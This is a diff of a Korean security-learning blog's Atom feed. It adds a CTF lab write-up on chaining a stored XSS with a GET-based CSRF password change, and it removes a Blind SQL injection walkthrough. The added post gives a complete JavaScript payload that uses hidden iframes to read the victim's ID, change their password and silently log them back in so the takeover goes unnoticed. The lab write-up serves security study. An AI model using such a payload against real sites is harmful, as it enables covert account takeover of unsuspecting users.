@@ -1,4 +1,171 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-20T23:48:59+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOqzteqyqeyekCA6IERPTSBCYXNlZCBYU1Mg7Leo7JW97KCQIO2OmOydtOyngCDssL7quLAuXG7qs7XqsqnsnpAgLT4-IOqzteqyqeyekCA6IOyVheyEsSDsiqTtgazrpr3tirjrpbwg64u07J2AIFVSTCDrp4zrk6wuXG7qs7XqsqnsnpAgLT4-IOyCrOyaqeyekCA6IFVSTOydhCDrs7TrgrTslrQg7YG066at7ZWY64-E66GdIOycoOuPhO2VnOuLpC5cbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDogVVJMIO2BtOumrVxu7IKs7Jqp7J6QIC0-PiDsm7kg7ISc67KEIDog7Y6Y7J207KeAIOyalOyyrVxu7Ju5IOyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog66-47JmE7ISxIO2OmOydtOyngCDsnZHri7VcbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDog7Y6Y7J207KeAIOuPmeyggeycvOuhnCDsmYTshLFcbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDog7JWF7ISxIOyKpO2BrOumve2KuCDsi6TtlolcbuyCrOyaqeyekCAtPj4g6rO16rKp7J6QIDog66-86rCQ7ZWcIOygleuztCDsoITri6wiLCJtZXJtYWlkIjpudWxsfQ" /></p>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">CSRF 간단한 정리</title><link href="http://localhost:4000/CSRF%EA%B0%84%EB%8B%A8%ED%95%9C%EC%A0%95%EB%A6%AC/" rel="alternate" type="text/html" title="CSRF 간단한 정리" /><published>2023-05-21T00:00:00+09:00</published><updated>2021-05-20T23:13:00+09:00</updated><id>http://localhost:4000/CSRF%EA%B0%84%EB%8B%A8%ED%95%9C%EC%A0%95%EB%A6%AC</id><content type="html" xml:base="http://localhost:4000/CSRF%EA%B0%84%EB%8B%A8%ED%95%9C%EC%A0%95%EB%A6%AC/"><![CDATA[<h2 id="csrf--cross-site-request-forgery--란">CSRF ( Cross Site Request Forgery ) 란</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-23T03:05:03+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOqzteqyqeyekCA6IERPTSBCYXNlZCBYU1Mg7Leo7JW97KCQIO2OmOydtOyngCDssL7quLAuXG7qs7XqsqnsnpAgLT4-IOqzteqyqeyekCA6IOyVheyEsSDsiqTtgazrpr3tirjrpbwg64u07J2AIFVSTCDrp4zrk6wuXG7qs7XqsqnsnpAgLT4-IOyCrOyaqeyekCA6IFVSTOydhCDrs7TrgrTslrQg7YG066at7ZWY64-E66GdIOycoOuPhO2VnOuLpC5cbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDogVVJMIO2BtOumrVxu7IKs7Jqp7J6QIC0-PiDsm7kg7ISc67KEIDog7Y6Y7J207KeAIOyalOyyrVxu7Ju5IOyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog66-47JmE7ISxIO2OmOydtOyngCDsnZHri7VcbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDog7Y6Y7J207KeAIOuPmeyggeycvOuhnCDsmYTshLFcbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDog7JWF7ISxIOyKpO2BrOumve2KuCDsi6TtlolcbuyCrOyaqeyekCAtPj4g6rO16rKp7J6QIDog66-86rCQ7ZWcIOygleuztCDsoITri6wiLCJtZXJtYWlkIjpudWxsfQ" /></p>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">CSRF 실습 1</title><link href="http://localhost:4000/CSRF%EC%8B%A4%EC%8A%B51/" rel="alternate" type="text/html" title="CSRF 실습 1" /><published>2023-05-23T00:00:00+09:00</published><updated>2021-05-23T23:13:00+09:00</updated><id>http://localhost:4000/CSRF%EC%8B%A4%EC%8A%B51</id><content type="html" xml:base="http://localhost:4000/CSRF%EC%8B%A4%EC%8A%B51/"><![CDATA[<h2 id="csrf-실습-1번-문제">CSRF 실습 1번 문제</h2>
+<ul>
+  <li><strong>csrf 공격</strong>을 이용하여 계정의 비밀번호를 바꿔야한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/c98520c7-9094-4710-a7f4-ed2bebd17d88" alt="Pasted image 20230522191000" /></li>
+</ul>
+
+<h2 id="취약점-찾기">취약점 찾기</h2>
+
+<h3 id="게시판-xss-취약점--stored-xss-취약점-">게시판 XSS 취약점 ( Stored XSS 취약점 )</h3>
+<ul>
+  <li>게시판 제목과 게시판 본문에 클라이언트 스크립트가 삽입된다.</li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">alert</code> 스크립트 코드를 이용하여 취약점 확인이 가능하다.</p>
+  </li>
+  <li>
+    <p>게시판 제목<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/928e3995-ef07-45a4-9cea-d420b2dbf74f" alt="Pasted image 20230522205649" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/ec5356a7-0f25-4d09-9c2d-c9b00f27c5c2" alt="Pasted image 20230522205704" /></p>
+  </li>
+  <li>본문<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/f9fddf28-eba9-44e0-9be3-666c478f7c93" alt="Pasted image 20230522205555" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d5f87e21-aebc-4f53-bde8-37fcd48b46ed" alt="Pasted image 20230522205622" /></li>
+</ul>
+
+<h3 id="비밀번호-변경-요청--csrf-취약점-">비밀번호 변경 요청 ( CSRF 취약점 )</h3>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">burp suite</code> 를 통해 POST 로 비밀번호 변경 요청을 보내는 것을 확인할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/7adae6a0-98ee-47e4-9a76-bb2703d428d5" alt="Pasted image 20230522205846" /></li>
+  <li>POST 방식에서 GET 방식으로 바꾸어 요청을 보내도 비밀번호가 변경되는 것을 확인할 수 있다.  로그인 한 상태에서 아래의 링크에 접속하면 비밀번호가 성공적으로 2222로 바뀐다.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://ctf.segfaulthub.com:7777/csrf_1/mypage_update.php?id=&amp;info=&amp;pw=2222
+</code></pre></div></div>
+
+<ul>
+  <li>GET 을 통한 비밀번호 변경<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/6e4840aa-91c9-461e-baa6-35a4ef7e0730" alt="Pasted image 20230522210844" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8d226f78-21e1-4750-822b-948174332578" alt="Pasted image 20230522210619" /></li>
+  <li>즉 URL 링크에 로그인한 사용자 브라우저에서 접속하게 된다면 사용자 몰래 비밀번호 변경이 가능하다.</li>
+</ul>
+
+<h3 id="로그인">로그인</h3>
+<ul>
+  <li>post 요청으로만 로그인을 할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/09e59aea-5fa1-4aee-a10d-306c196de303" alt="Pasted image 20230522225144" /></li>
+</ul>
+
+<h2 id="공격-시나리오">공격 시나리오</h2>
+<h3 id="url-클릭-유도하기">URL 클릭 유도하기</h3>
+<ul>
+  <li>crsf 취약점이 있는 비밀번호 변경 url을 이용한다.</li>
+  <li>공격자가 비밀번호 변경 url 을 만들어 사용자에게 보내 클릭하도록 유도한다.</li>
+  <li>하지만 이러한 공격을 성공시킬려면 사용자가 로그인을 한 상태에서 공격자에게서 받은 링크에 접속하여야 한다.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>비밀번호 2222로 변경하기
+http://ctf.segfaulthub.com:7777/csrf_1/mypage_update.php?id=&amp;info=&amp;pw=2222
+</code></pre></div></div>
+
+<h3 id="xss--csrf-취약점-합쳐서-공격하기">XSS + CSRF 취약점 합쳐서 공격하기</h3>
+<h4 id="최종-목표">최종 목표</h4>
+<ul>
+  <li>사용자가 게시글을 열람하면 사용자의 비밀번호가 공격자가 설정한 비밀번호로 즉시 변경된다. 단 사용자는 비밀번호 변경이 일어났는지 알아서는 안된다.</li>
+</ul>
+
+<h4 id="현재-서버-비밀번호-변경시-발생되는-일--예측-">현재 서버 비밀번호 변경시 발생되는 일 ( 예측 )</h4>
+<ol>
+  <li>정상적으로 비밀번호 변경을 요청하면 비밀번호가 사용자가 입력한 값으로 바뀐다.</li>
+  <li>현재 로그인 중인 세션 값은 만료가 되어 로그아웃이 된다.</li>
+  <li>다시 로그인 하기 위하여 로그인 페이지로 넘어간다.</li>
+</ol>
+
+<h4 id="공격-시나리오-1">공격 시나리오</h4>
+<ol>
+  <li>공격자는 악의적인 스크립트가 들어간 게시글을 작성한다.</li>
+  <li>사용자가 로그인 하여 게시글을 살펴본다.</li>
+  <li>사용자는 공격자가 작성한 게시글을 클릭하여 게시글 페이지에 들어간다.</li>
+  <li>게시글 페이지에 들어가면 악의적인 스크립트에 의해 사용자의 비밀번호가 공격자가 설정한 비밀번호로 변경된다.</li>
+</ol>
+
+<h4 id="공격-스크립트-작성">공격 스크립트 작성</h4>
+
+<h5 id="마이페이지를-통해-아이디-가져오기">마이페이지를 통해 아이디 가져오기</h5>
+<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/3c459cd1-2d95-4cbb-9e2c-c9c013ec1fe7" alt="Pasted image 20230523003251" /></p>
+
+<ul>
+  <li>마이페이지를 통해 사용자 아이디 찾기.</li>
+</ul>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">style=</span><span class="s">"display:none;"</span>  <span class="na">onload=</span><span class="s">"get_id()"</span> <span class="na">src=</span><span class="s">"http://ctf.segfaulthub.com:7777/csrf_1/mypage.php"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/iframe&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="kd">function</span> <span class="nf">get_id</span><span class="p">(){</span>
+	<span class="nx">id</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByName</span><span class="p">(</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">placeholder</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<h5 id="비밀번호-변경-스크립트">비밀번호 변경 스크립트</h5>
+<ul>
+  <li>img 태그의 src 부분을 이용하였다.</li>
+  <li>게시글 방문만 하면 바로 비밀번호가 변경된다.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://ctf.segfaulthub.com:7777/csrf_1/mypage_update.php?id=&amp;info=&amp;pw=2222
+</code></pre></div></div>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+<span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://ctf.segfaulthub.com:7777/csrf_1/mypage_update.php?id=&amp;info=&amp;pw=2222</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span><span class="o">=</span><span class="nx">url</span><span class="p">;</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<h5 id="다시-공격자가-설정한-비밀번호로-다시-로그인하기">다시 공격자가 설정한 비밀번호로 다시 로그인하기.</h5>
+<ul>
+  <li>세션 값을 못 쓰게되어 자동으로 로그아웃이 된다. 따라서 iframe을 통해 다시 로그인하여 사용자는 로그아웃 없이 계속 페이지를 이용하는 것 처럼 느낄 수 있다.</li>
+  <li>
+    <p>다시 로그인을 해주면 세션 값이 새로운 값으로 바뀌게 된다.</p>
+  </li>
+  <li>로그인 화면 표시.</li>
+</ul>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">style=</span><span class="s">"display:none;"</span> <span class="na">src=</span><span class="s">"http://ctf.segfaulthub.com:7777/csrf_1/login.php"</span> <span class="na">onload=</span><span class="s">"change()"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>아이디 및 비밀번호 입력 &amp; 로그인 하기</li>
+</ul>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+<span class="kd">function</span> <span class="nf">change</span><span class="p">(){</span>
+	<span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">login-id</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">id</span><span class="p">;</span>
+	<span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">login-pw</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">pw</span><span class="p">;</span>
+	<span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">submit</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<h5 id="최종-공격-스크립트">최종 공격 스크립트</h5>
+<ul>
+  <li>가장 먼저 마이페이지에서 아이디를 가지고 온다.</li>
+  <li>그런 다음 비밀번호를 변경하여준다.</li>
+  <li>마지막으로 바뀐 비밀번호로 다시 로그인해준다.</li>
+</ul>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">style=</span><span class="s">"display:none;"</span> <span class="na">src=</span><span class="s">"http://ctf.segfaulthub.com:7777/csrf_1/mypage.php"</span> <span class="na">onload=</span><span class="s">"get_id()"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/iframe&gt;</span>
+<span class="nt">&lt;iframe</span> <span class="na">style=</span><span class="s">"display:none;"</span> <span class="na">src=</span><span class="s">"http://ctf.segfaulthub.com:7777/csrf_1/login.php"</span> <span class="na">onload=</span><span class="s">"change()"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="kd">var</span> <span class="nx">id</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">pw</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">1234</span><span class="dl">"</span><span class="p">;</span>
+<span class="kd">function</span> <span class="nf">get_id</span><span class="p">(){</span>
+	<span class="nx">id</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByName</span><span class="p">(</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">placeholder</span><span class="p">;</span>
+	
+	<span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://ctf.segfaulthub.com:7777/csrf_1/mypage_update.php?id=&amp;info=&amp;pw=</span><span class="dl">"</span><span class="o">+</span><span class="nx">pw</span><span class="p">;</span>
+<span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span><span class="o">=</span><span class="nx">url</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kd">function</span> <span class="nf">change</span><span class="p">(){</span>
+	<span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">login-id</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">id</span><span class="p">;</span>
+	<span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">login-pw</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">pw</span><span class="p">;</span>
+	<span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">submit</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<h4 id="공격시작">공격시작</h4>
+<ol>
+  <li>완성된 스크립트를 이용하여 게시글을 작성한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/089f4135-01d5-4fc3-9ea5-12a8d5e5f65d" alt="Pasted image 20230523022549" /></li>
+  <li>게시글을 저장해준다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/40c9edbf-9fa2-4377-91b8-7cd6e8af08a5" alt="Pasted image 20230523005809" /></li>
+  <li>사용자가 게시글을 방문하게 되면 비밀번호가 스크립트에서 설정한 <code class="language-plaintext highlighter-rouge">1234</code>로 변경된다. 서버에서는 자동으로 세션 값이 만료 시킨다. 로그인이 필요하지만 사용자는 정상적으로 게시글에 방문한 것 처럼 느끼게 된다. 왜냐하면 바뀐 비밀번호로 로그인을 하여 세션 값을 서버로부터 받기 때문이다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/01194217-8ab1-4b51-9a2b-1ba16c4c51dc" alt="Pasted image 20230523023818" /></li>
+</ol>
+
+<h2 id="결론">결론</h2>
+<ul>
+  <li>iframe 과 서로 쿠키 값을 공유하기 때문에 가능한 방법이었다.</li>
+  <li>사용자는 정상적으로 게시글을 확인한 것 처럼 느낄것이다. 하지만 사용자는 로그아웃 하고 다시 로그인 할 때 비밀번호가 변경되었다는 것을 알 수 있다.</li>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="CSRF" /><category term="웹 해킹" /><summary type="html"><![CDATA[CSRF 실습 1번 문제를 풀어보자.]]></summary></entry><entry><title type="html">CSRF 간단한 정리</title><link href="http://localhost:4000/CSRF%EA%B0%84%EB%8B%A8%ED%95%9C%EC%A0%95%EB%A6%AC/" rel="alternate" type="text/html" title="CSRF 간단한 정리" /><published>2023-05-21T00:00:00+09:00</published><updated>2021-05-20T23:13:00+09:00</updated><id>http://localhost:4000/CSRF%EA%B0%84%EB%8B%A8%ED%95%9C%EC%A0%95%EB%A6%AC</id><content type="html" xml:base="http://localhost:4000/CSRF%EA%B0%84%EB%8B%A8%ED%95%9C%EC%A0%95%EB%A6%AC/"><![CDATA[<h2 id="csrf--cross-site-request-forgery--란">CSRF ( Cross Site Request Forgery ) 란</h2>
 <ul>
   <li>요청을 위조하는 공격이다.</li>
   <li>피해자가 몰랐던 요청을 서버에 보내게 하는 공격이다.</li>
@@ -1487,53 +1654,4 @@ blind sql injection success
   <li><a href="https://totoscoming-coding.tistory.com/36"> HTML 예제 - 게시판 글쓰기 창 :: 쩝쩝산중 코딩로그 (tistory.com)</a></li>
   <li><a href="https://gent.tistory.com/323">오라클 컬럼(Column) 추가, 삭제 방법 (컬럼 순서 변경) (tistory.com)</a></li>
   <li><a href="https://offbyone.tistory.com/316">오라클 에러 ORA-00984: 열을 사용할 수 없습니다 (tistory.com)</a></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="웹" /><category term="JSP" /><category term="SERVLET" /><category term="JAVA" /><summary type="html"><![CDATA[메뉴 버튼 및 게시판 제작 하기]]></summary></entry><entry><title type="html">Blind SQL Injection 과정</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/BlindSQLi/" rel="alternate" type="text/html" title="Blind SQL Injection 과정" /><published>2023-04-30T00:00:00+09:00</published><updated>2023-04-30T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/BlindSQLi</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/BlindSQLi/"><![CDATA[<h2 id="이전-포스팅">이전 포스팅</h2>
-<p><a href="https://mingyu2.github.io/SQLi%EB%B0%A9%EB%B2%95/">Union SQLi 과 Error Based SQLi 과정 정리.</a></p>
-
-<h2 id="mysql-사전-지식">MYSQL 사전 지식</h2>
-
-<h3 id="db-명-출력하기">DB 명 출력하기</h3>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">database</span><span class="p">()</span> <span class="k">from</span> <span class="n">dual</span><span class="p">;</span>
-</code></pre></div></div>
-
-<h3 id="테이블명-출력하기">테이블명 출력하기</h3>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">'DB명'</span>
-</code></pre></div></div>
-
-<h3 id="컬럼명-출력하기">컬럼명 출력하기</h3>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">column_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'테이블명'</span>
-</code></pre></div></div>
-
-<h2 id="blind-sqli">Blind SQLi</h2>
-<ul>
-  <li>참과 거짓 조건에 따른 응답을 이용하여 한글자씩 알아내어 데이터를 추출하는 공격이다.</li>
-</ul>
-
-<h3 id="조건">조건</h3>
-<ul>
-  <li>결과가 화면에 안나오는 곳에서 사용한다.</li>
-  <li>참과 거짓 조건에 따라 응답이 다른 곳에서 이용가능하다.</li>
-</ul>
-
-<h3 id="필요-함수">필요 함수</h3>
-<ul>
-  <li>substring</li>
-  <li>ascii</li>
-</ul>
-
-<h3 id="과정">과정</h3>
-<ol>
-  <li>서버에서 어떤 질의문을 사용하는지 예측하기.
-    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">x</span> <span class="k">from</span> <span class="n">x</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'x'</span><span class="p">;</span>
-</code></pre></div>    </div>
-  </li>
-  <li>
-    <p>Blind SQLi 을 사용하기 위하여 참/거짓 일때 응답 결과가 다른지 확인하기.<br /><script src="https://gist.github.com/MinGyu2/f65663add3c2cf18dc2b4d996a442919.js"></script></p>
-  </li>
-  <li><code class="language-plaintext highlighter-rouge">select</code> 문 사용 가능한지 확인하기.<br /><script src="https://gist.github.com/MinGyu2/4fe0c4b88eaf431299f49c54cb89d8f1.js"></script></li>
-  <li>공격 포맷 만들기.<br /><script src="https://gist.github.com/MinGyu2/b7db2b39edc6e326b2426cc6a34fdeb5.js"></script></li>
-  <li>database 이름 추출하기. 한 문자씩 알아내어야 한다.<br /><script src="https://gist.github.com/MinGyu2/cd056483c528aad3bb968bf459155150.js"></script></li>
-  <li>테이블 이름들 추출하기. <br /><script src="https://gist.github.com/MinGyu2/65ae660dd4ef296c1a50279c04dc8467.js"></script></li>
-  <li>컬럼 명 추출 하기.<br /><script src="https://gist.github.com/MinGyu2/17bae3c8991982ee9e076df17b090fa7.js"></script></li>
-  <li>정보 추출하기.<br /><script src="https://gist.github.com/MinGyu2/5b9e37325e12999931619d2a70f71dac.js"></script></li>
-</ol>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="sql injection" /><category term="Mysql" /><category term="DB" /><summary type="html"><![CDATA[Blind SQL Injection 과정 정리.]]></summary></entry></feed>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="웹" /><category term="JSP" /><category term="SERVLET" /><category term="JAVA" /><summary type="html"><![CDATA[메뉴 버튼 및 게시판 제작 하기]]></summary></entry></feed>
